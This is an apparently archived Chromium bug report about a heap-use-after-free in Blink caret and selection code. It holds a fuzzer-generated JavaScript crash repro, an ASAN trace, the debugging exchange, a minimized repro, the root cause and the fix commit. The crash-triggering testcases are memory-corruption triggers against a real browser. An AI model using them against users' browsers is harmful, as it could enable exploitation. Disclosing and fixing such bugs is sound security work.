# Security: heap-use-after-free in blink::LayoutObject::SetShouldCheckForPaintInvalidationWithoutGeometryChange

| Field | Value |
|-------|-------|
| **Issue ID** | [40093919](https://issues.chromium.org/issues/40093919) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Editing>Selection |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | xi...@chromium.org |
| **Created** | 2019-02-01 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The attached testcase crashes the latest ASAN build of content\_shell. It requires an empty file 'empty.html' in the same directory as the testcase both served from a HTTP server. The testcase could require a few attempts to trigger.

**VERSION**  

Chrome Version: asan-linux-release-628257  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o2=document.createElement('textarea');
document.body.appendChild(o2);
o9=window.open('empty.html','popup16'+Math.random(),'outerHeight=0,innerHeight=11,innerWidth=-6');
o9.onload=fun1;
o30=document.createElement('div');
o164=document.createElement('div');
o318=document.createElement('iframe');
o318.addEventListener('load', fun0,false);
document.body.appendChild(o318);
o320=document.createElement('div');
o320.innerHTML="<svg><style><set ><desc>";
o321=o320.firstChild.getElementsByTagName('\\*');
o322=o321[2];
o357=document.documentElement;
}
function fun0() {
o400=o318.contentDocument;
o402=o400.getElementsByTagName('\\*')[2];
}
function fun1(e) {
o405=e.target;
o410=o405.getElementsByTagName('\\*')[2];
setTimeout(fun2, 4);
}
function fun2() {
o402.onpagehide=fun3;
o451=o410['prepend'](o30,2);
o30.appendChild(o402);
o164.appendChild(o357);
o2.select();
o402.appendChild(o164);
}
function fun3() {
o2.select();
setTimeout(fun4, 4);
}
function fun4() {
o2.select();
setTimeout(fun5, 4);
}
function fun5() {
o322.prepend(1,1,1,o2);
window.setTimeout("location.reload()", 100);
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==17049==ERROR: AddressSanitizer: heap-use-after-free on address 0x61200004c700 at pc 0x556f58de01c9 bp 0x7ffff00eab20 sp 0x7ffff00eab18  

READ of size 8 at 0x61200004c700 thread T0 (content\_shell)  

#0 0x556f58de01c8 in ShouldCheckForPaintInvalidation third\_party/blink/renderer/core/layout/layout\_object.h:2662:5  

#1 0x556f58de01c8 in ShouldCheckForPaintInvalidation third\_party/blink/renderer/core/layout/layout\_object.h:1846  

#2 0x556f58de01c8 in blink::LayoutObject::SetShouldCheckForPaintInvalidationWithoutGeometryChange() third\_party/blink/renderer/core/layout/layout\_object.cc:4001  

#3 0x556f58db3114 in blink::LayoutObject::SetShouldCheckForPaintInvalidation() third\_party/blink/renderer/core/layout/layout\_object.cc:3996:3  

#4 0x556f5772b833 in blink::CaretDisplayItemClient::UpdateStyleAndLayoutIfNeeded(blink::PositionWithAffinityTemplate<blink::EditingAlgorithm[blink::NodeTraversal](javascript:void(0);) > const&) third\_party/blink/renderer/core/editing/caret\_display\_item\_client.cc:149:22  

#5 0x556f577295a8 in blink::FrameCaret::UpdateStyleAndLayoutIfNeeded() third\_party/blink/renderer/core/editing/frame\_caret.cc:154:25  

#6 0x556f57cc09ee in blink::LocalFrameView::UpdateStyleAndLayoutIfNeededRecursive() third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2835:26  

#7 0x556f57cbe06b in blink::LocalFrameView::RunStyleAndLayoutLifecyclePhases(blink::DocumentLifecycle::LifecycleState) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2225:5  

#8 0x556f57cbcf0f in blink::LocalFrameView::UpdateLifecyclePhasesInternal(blink::DocumentLifecycle::LifecycleState) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2178:7  

#9 0x556f57cba4c5 in blink::LocalFrameView::UpdateLifecyclePhases(blink::DocumentLifecycle::LifecycleState, blink::DocumentLifecycle::LifecycleUpdateReason) third\_party/blink/renderer/core/frame/local\_frame\_view.cc:2156:3  

#10 0x556f5951436d in blink::PageAnimator::UpdateAllLifecyclePhases(blink::LocalFrame&, blink::DocumentLifecycle::LifecycleUpdateReason) third\_party/blink/renderer/core/page/page\_animator.cc:112:9  

#11 0x556f5797bb9c in blink::WebViewImpl::UpdateLifecycle(blink::WebWidget::LifecycleUpdate, blink::WebWidget::LifecycleUpdateReason) third\_party/blink/renderer/core/exported/web\_view\_impl.cc:1572:3  

#12 0x556f5d99f5a7 in content::RenderWidget::UpdateVisualState() content/renderer/render\_widget.cc:1195:19  

#13 0x556f5424ea8b in cc::ProxyMain::BeginMainFrame(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) cc/trees/proxy\_main.cc:231:21  

#14 0x556f542667e8 in Invoke<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > base/bind\_internal.h:517:12  

#15 0x556f542667e8 in MakeItSo<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > base/bind\_internal.h:637  

#16 0x556f542667e8 in void base::internal::Invoker<base::internal::BindState<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, void ()>::RunImpl<void (cc::ProxyMain::\*)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::\_\_1::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, 0ul, 1ul>(void (cc::ProxyMain::\*&&)(std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), std::\_\_1::tuple<base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<std::\_\_1::unique\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >&&, std::\_\_1::integer\_sequence<unsigned long, 0ul, 1ul>) base/bind\_internal.h:690  

#17 0x556f4fc7a9de in Run base/callback.h:99:12  

#18 0x556f4fc7a9de in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:105  

#19 0x556f4fc7646a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#20 0x556f4fc7a9de in Run base/callback.h:99:12  

#21 0x556f4fc7a9de in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:105  

#22 0x556f4fc7cffd in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*, bool\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:299:21  

#23 0x556f4fc7de57 in DoWork base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:222:7  

#24 0x556f4fc7de57 in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#25 0x556f4fb8301f in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#26 0x556f4fc7eace in Run base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:370:12  

#27 0x556f4fc7eace in non-virtual thunk to base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc  

#28 0x556f4fbed076 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#29 0x556f5db22e28 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:233:16  

#30 0x556f4d212b00 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:504:14  

#31 0x556f4d216bbc in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:870:10  

#32 0x556f55305097 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:461:29  

#33 0x556f4a453d2c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#34 0x556f47694547 in main content/shell/app/shell\_main.cc:39:10  

#35 0x7fd107215b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

0x61200004c700 is located 64 bytes inside of 264-byte region [0x61200004c6c0,0x61200004c7c8)  

freed by thread T0 (content\_shell) here:  

#0 0x556f47664552 in \_\_interceptor\_free /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:123:3  

#1 0x556f58dd7248 in blink::LayoutObject::DestroyAndCleanupAnonymousWrappers() third\_party/blink/renderer/core/layout/layout\_object.cc  

#2 0x556f57434fa0 in blink::Node::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/node.cc:1424:24  

#3 0x556f5730f472 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2134:22  

#4 0x556f5711e7c5 in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/container\_node.cc:978:12  

#5 0x556f5730f455 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2131:20  

#6 0x556f5711bfb5 in blink::ContainerNode::RemoveBetween(blink::Node\*, blink::Node\*, blink::Node&) third\_party/blink/renderer/core/dom/container\_node.cc:731:15  

#7 0x556f5711869e in blink::ContainerNode::RemoveChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:709:7  

#8 0x556f57114801 in blink::CollectChildrenAndRemoveFromOldParent(blink::Node&, blink::HeapVector<blink::Member[blink::Node](javascript:void(0);), 11u>&, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:152:17  

#9 0x556f57113cac in blink::ContainerNode::AppendChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/container\_node.cc:836:8  

#10 0x556f57429b4e in blink::Node::appendChild(blink::Node\*, blink::ExceptionState&) third\_party/blink/renderer/core/dom/node.cc:715:35  

#11 0x556f5742a0ae in blink::ConvertNodesIntoNode(blink::HeapVector<blink::NodeOrString, 0u> const&, blink::Document&, blink::ExceptionState&) third\_party/blink/renderer/core/dom/node.cc:772:15  

#12 0x556f57429d27 in blink::Node::Prepend(blink::HeapVector<blink::NodeOrString, 0u> const&, blink::ExceptionState&) third\_party/blink/renderer/core/dom/node.cc:782:20  

#13 0x556f556b6753 in prepend third\_party/blink/renderer/core/dom/parent\_node.h:66:17  

#14 0x556f556b6753 in PrependMethod gen/third\_party/blink/renderer/bindings/core/v8/v8\_element.cc:3354  

#15 0x556f556b6753 in blink::V8Element::PrependMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_element.cc:5038  

#16 0x556f4ac31db2 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) v8/src/api-arguments-inl.h:146:3  

#17 0x556f4ac2f14f in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36  

#18 0x556f4ac2cb9a in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:139:5  

#19 0x556f4cbf0dca in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_NoBuiltinExit (/fuzzer3/dl/asan-linux-release-628257/content\_shell+0xb70cdca)  

#20 0x556f4cb54f96 in Builtins\_InterpreterEntryTrampoline (/fuzzer3/dl/asan-linux-release-628257/content\_shell+0xb670f96)  

#21 0x556f4cb5283f in Builtins\_JSEntryTrampoline (/fuzzer3/dl/asan-linux-release-628257/content\_shell+0xb66e83f)  

#22 0x556f4cb525cc in Builtins\_JSEntry (/fuzzer3/dl/asan-linux-release-628257/content\_shell+0xb66e5cc)  

#23 0x556f4b6edb62 in Call v8/src/simulator.h:124:12  

#24 0x556f4b6edb62 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution.cc:266  

#25 0x556f4b6eced4 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:358:10  

#26 0x556f4aab39f0 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:5013:7  

#27 0x556f55549b7a in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:417:17  

#28 0x556f55b1d8a7 in blink::V8Function::Invoke(blink::ScriptWrappable\*, WTF::Vector<blink::ScriptValue, 0u, WTF::PartitionAllocator> const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_function.cc:90:8  

#29 0x556f55b1e30d in blink::V8Function::InvokeAndReportException(blink::ScriptWrappable\*, WTF::Vector<blink::ScriptValue, 0u, WTF::PartitionAllocator> const&) gen/third\_party/blink/renderer/bindings/core/v8/v8\_function.cc:223:7  

#30 0x556f57bb2831 in blink::ScheduledAction::Execute(blink::LocalFrame\*) third\_party/blink/renderer/bindings/core/v8/scheduled\_action.cc:165:16  

#31 0x556f57bb247f in blink::ScheduledAction::Execute(blink::ExecutionContext\*) third\_party/blink/renderer/bindings/core/v8/scheduled\_action.cc:146:5  

#32 0x556f57baf407 in blink::DOMTimer::Fired() third\_party/blink/renderer/core/frame/dom\_timer.cc:176:11

previously allocated by thread T0 (content\_shell) here:  

#0 0x556f476648d3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:145:3  

#1 0x556f58d973f2 in AllocFlags base/allocator/partition\_allocator/partition\_alloc.h:274:18  

#2 0x556f58d973f2 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:267  

#3 0x556f58d973f2 in blink::LayoutObject::operator new(unsigned long) third\_party/blink/renderer/core/layout/layout\_object.cc:202  

#4 0x556f5818b5af in blink::TextControlInnerEditorElement::CreateLayoutObject(blink::ComputedStyle const&) third\_party/blink/renderer/core/html/forms/text\_control\_inner\_elements.cc:136:10  

#5 0x556f573d7bf4 in blink::LayoutTreeBuilderForElement::CreateLayoutObject() third\_party/blink/renderer/core/dom/layout\_tree\_builder.cc:143:44  

#6 0x556f5730c1ab in CreateLayoutObjectIfNeeded third\_party/blink/renderer/core/dom/layout\_tree\_builder.h:106:7  

#7 0x556f5730c1ab in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2063  

#8 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#9 0x556f5730c6a0 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2078:18  

#10 0x556f57fe3006 in blink::HTMLFormControlElement::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/html/forms/html\_form\_control\_element.cc:233:16  

#11 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#12 0x556f5730c6e6 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2082:20  

#13 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#14 0x556f5730c6e6 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2082:20  

#15 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#16 0x556f5730c6e6 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2082:20  

#17 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#18 0x556f5730c6e6 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2082:20  

#19 0x556f5711e69d in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:971:12  

#20 0x556f5730c6e6 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2082:20  

#21 0x556f57316f0f in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2448:5  

#22 0x556f57127f89 in blink::ContainerNode::RebuildLayoutTreeForChild(blink::Node\*, blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1421:14  

#23 0x556f571284a2 in blink::ContainerNode::RebuildChildrenLayoutTrees(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1465:5  

#24 0x556f5731756a in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2475:7  

#25 0x556f57127f89 in blink::ContainerNode::RebuildLayoutTreeForChild(blink::Node\*, blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1421:14  

#26 0x556f571284a2 in blink::ContainerNode::RebuildChildrenLayoutTrees(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/container\_node.cc:1465:5  

#27 0x556f5731756a in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2475:7  

#28 0x556f57039f37 in blink::StyleEngine::RebuildLayoutTree() third\_party/blink/renderer/core/css/style\_engine.cc:1725:18  

#29 0x556f571872a0 in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2330:24  

#30 0x556f57178077 in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2237:3  

#31 0x556f57177aba in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2175:26  

#32 0x556f571c0221 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6170:7

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/core/layout/layout\_object.h:2662:5 in ShouldCheckForPaintInvalidation  

Shadow bytes around the buggy address:  

0x0c2480001890: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa  

0x0c24800018a0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c24800018b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c24800018c0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c24800018d0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

=>0x0c24800018e0:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c24800018f0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c2480001900: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c2480001910: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c2480001920: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa  

0x0c2480001930: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==17049==ABORTING

## Attachments

- [patched_crash.txt](attachments/patched_crash.txt) (text/plain, 23.1 KB)
- [patched_crash2.txt](attachments/patched_crash2.txt) (text/plain, 28.8 KB)
- [patched_crash3.txt](attachments/patched_crash3.txt) (text/plain, 26.5 KB)
- [patched_crash4.txt](attachments/patched_crash4.txt) (text/plain, 34.4 KB)

## Timeline

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

[Comment Deleted]

### cl...@chromium.org (2019-02-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5361492639744000.

### cl...@chromium.org (2019-02-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5160227754344448.

### me...@chromium.org (2019-02-02)

Couldn't repro this locally.

Sorry for the spam. I didn't realize my method for getting ClusterFuzz to test this multiple times would result in separate analyses. I'll clean this bug up once they finish.

(It's only fair that I spam this bug since the testcase opens millions of windows :-)

### me...@chromium.org (2019-02-04)

Still can't repro this locally.

wangxianzhu@ or vmpstr@, would one of you mind taking a look at this (or suggesting who might be a good owner)?




[Monorail components: Blink>Paint]

### wa...@chromium.org (2019-02-04)

It seems that CaretDisplayItemClient references a deleted LayoutBlock. I ever worked on it.

### wa...@chromium.org (2019-02-04)

cloudfuzzer@gmail.com: setTimeouts in the test can be modified to requestAnimationFrame(() => setTimeout(...)) to reproduce paint bugs more reliably because it ensures a full frame update before the callback is called. I also suggested clusterfuzz team of this.

### sh...@chromium.org (2019-02-05)

[Empty comment from Monorail migration]

### do...@chromium.org (2019-02-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-06)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### wa...@chromium.org (2019-02-06)

I couldn't reproduce the issue either, even after I changed setTimeout to requestAnimationFrame(() => setTimeout(...)). The clusterfuzz bots also didn't reproduce the issue.

I haven't found any culprit in the code. A LayoutBlock being destroyed informs the CaretDisplayItemClient which will clear the pointer to the layout block.

There seems nothing useful to do from me for now.

cloudfuzzer@gmail.com (are you a real person or a bot?): how many runs did you try before reproducing the issue? How long do you wait for a run before killing it (as it seems to open new windows forever)? 




### cl...@gmail.com (2019-02-06)

Hey,
not a bot :) It reproduces fairly reliable for me (usually after <5 reloads). However I noticed that it only does if the system is under high load (It was fuzzing while reproducing and minimising). I tried the linux 'stress' tool wih high settings (probably needs adjusting to the system) and this worked well, too.

I will try and see whether I can adjust the testcase to reproduce more reliable without load on the system.

### wa...@chromium.org (2019-02-06)

Thanks cloudfuzzer@gmail.com for the reply. I tried stress and still no lucky. Can you try this patch https://chromium-review.googlesource.com/c/chromium/src/+/1457459 (which adds some logs), and after reproducing the bug, paste the logs before the crash?

### sh...@chromium.org (2019-02-07)

[Empty comment from Monorail migration]

### be...@chromium.org (2019-02-08)

[Empty comment from Monorail migration]

### cl...@gmail.com (2019-02-11)

Sorry for the delay. Please find the output with patch attached.

### wa...@chromium.org (2019-02-11)

cloudfuzzer@gmail.com, thank you very much for the test.

Unfortunately the patch didn't discover the cause.

I modified the patch to log more information. Can you please try it again?

### cl...@gmail.com (2019-02-11)

Sure can do. This looks a little more interesting

### wa...@chromium.org (2019-02-11)

Thanks for the test. It's really useful.

### wa...@chromium.org (2019-02-11)

I have a theory of this bug and need the last try to proof it. cloudfuzzer@gmail.com can you try the latest patch again? Thanks.

### cl...@gmail.com (2019-02-12)

This segfaults reliably. I used ASAN_OPTIONS=handle_segv=2 to get an ASAN stack trace.

### wa...@chromium.org (2019-02-12)

Thanks cloudfuzzer@gmail.com for the test. I'm sorry that in the last patch I made a mistake causing the program to crash before catching the bug situation. I updated the patch and this is hopefully the last one for debugging. Can you test again?

### cl...@gmail.com (2019-02-12)

No worries. Output attached.

### wa...@chromium.org (2019-02-12)

Thanks for the test!

It proved that the bug is not a painting issue. It's because FrameCaret::CaretPosition() may return a position in another frame, causing CaretDisplayItemClient to point to a LayoutBlock from another frame so won't get notified when the LayoutBlock is deleted. This happens when a DOM subtree is moved from one frame to another.

A simple fix could be to add CHECK_EQ(frame_, selection.Start().AnchorNode()->GetFrame()) in FrameCaret::CaretPosition(), but I'm not sure there are still other underlying issues, so I'm assigning to Xiaocheng who recently made some changes about caret (though I'm not sure if this bug is a regression).

[Monorail components: -Blink>Paint Blink>Editing]

### wa...@chromium.org (2019-02-12)

[Empty comment from Monorail migration]

### xi...@chromium.org (2019-02-12)

I'm hitting an earlier DCHECK:

[1:1:0212/141130.182739:FATAL:selection_template.cc(262)] Check failed: position.IsConnected(). DIV@offsetInAnchor[0]
#0 0x55c37c59f359 base::debug::CollectStackTrace()
#1 0x55c37c4dc793 base::debug::StackTrace::StackTrace()
#2 0x55c37c4f47ca logging::LogMessage::~LogMessage()
#3 0x55c37e8d120a blink::SelectionTemplate<>::Builder::Collapse()
#4 0x55c37ebaeae9 blink::TextControlElement::SetSelectionRange()
#5 0x55c37ebad785 blink::TextControlElement::setSelectionRangeForBinding()
#6 0x55c37ebada88 blink::TextControlElement::select()

Let me fix it first.

[Monorail components: -Blink>Editing Blink>Editing>Selection]

### wa...@chromium.org (2019-02-12)

I wonder why I couldn't reproduce it locally even with DCHECK enabled. Perhaps it depends on particular timing? It's great that Xiaocheng can reproduce it. 

### xi...@chromium.org (2019-02-12)

Minimized repro for #36:

<textarea id=textarea></textarea>
<iframe id=iframe></iframe>
<script>
const textarea = document.getElementById('textarea');
const iframe = document.getElementById('iframe');
iframe.contentDocument.body.onpagehide = () => textarea.select();

// Triggers onpagehide
document.documentElement.remove();

// DCHECK hits
textarea.select();
</script>

### xi...@chromium.org (2019-02-13)

Root cause: Normally, |Document::focused_element_| should never be a detached element, as it should be set to null when the element is detached. This is done in |ContainerNode::RemoveChild()| by calling |Document::RemoveFocusedElementOfSubtree()|.

However, after clearing focus, |ContainerNode::WillRemoveChild()| is called, which may invoke event handlers that sets focus on an element that will be removed. In this way, we end up having a detached focused element.

Then, we hit DCHECK when TextControlElement assumes that |Document::FocusedElement()| is connected.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b

commit 89fd23887da1ef574a6fc97ab5f48d5b3e3dca4b
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Wed Feb 13 06:12:12 2019

TextControlElement should not change frame selection when detached

TextControlElement::SetSelectionRange() maintains its own selection
range cache, and changes FrameSelection when focused. However, there are
some cases where the document's focused element can be left detached,
resulting in TextControlElement to set invalid FrameSelection.

As fixing the the focus maintenance is more involved, this patch works
around that by stopping TextControlElement to set FrameSelection if it's
detached.

Bug: 927646
